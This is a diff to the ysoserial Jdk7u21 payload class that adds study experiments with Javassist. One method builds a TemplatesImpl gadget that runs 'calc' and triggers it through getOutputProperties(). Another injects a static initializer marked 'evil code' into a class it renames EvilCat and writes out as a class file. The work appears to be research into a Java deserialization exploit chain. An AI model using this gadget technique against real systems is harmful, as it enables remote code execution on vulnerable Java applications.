@@ -6,6 +6,11 @@ import java.util.LinkedHashSet;
 
 import javax.xml.transform.Templates;
 
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtField;
+import javassist.Modifier;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
@@ -89,7 +94,39 @@ public class Jdk7u21 implements ObjectPayload<Object> {
 	}
 
 	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(Jdk7u21.class, args);
+//		PayloadRunner.run(Jdk7u21.class, args);
+//        main1();
+        testJavaAssist2();
 	}
+
+    public static void main1() throws Exception {
+        TemplatesImpl object = (TemplatesImpl)Gadgets.createTemplatesImpl("calc");
+        object.getOutputProperties();
+    }
+
+    public static void testJavaAssist() throws Exception {
+        ClassPool classPool = ClassPool.getDefault();
+        // 新建一个类，全限定名是`com.cqq.Me`
+        CtClass ctClassMe = classPool.makeClass("com.cqq.Me");
+
+        // 给ctClassMe（com.cqq.Me）这个类定义一个字段，`String name`
+        CtField ctFieldName= new CtField(classPool.get("java.lang.String"), "name", ctClassMe);
+
+        // 给name这个字段设置访问限定符，`private String name`
+        ctFieldName.setModifiers(Modifier.PRIVATE);
+
+    }
+
+    public static void testJavaAssist2() throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass cc = pool.get(ysoserial.Cqq.class.getName());
+        String cmd = "System.out.println(\"evil code\");";
+        // 创建 static 代码块，并插入代码
+        cc.makeClassInitializer().insertBefore(cmd);
+        String randomClassName = "EvilCat" + System.nanoTime();
+        cc.setName(randomClassName);
+        // 写入.class 文件
+        cc.writeFile();
+    }
 
 }
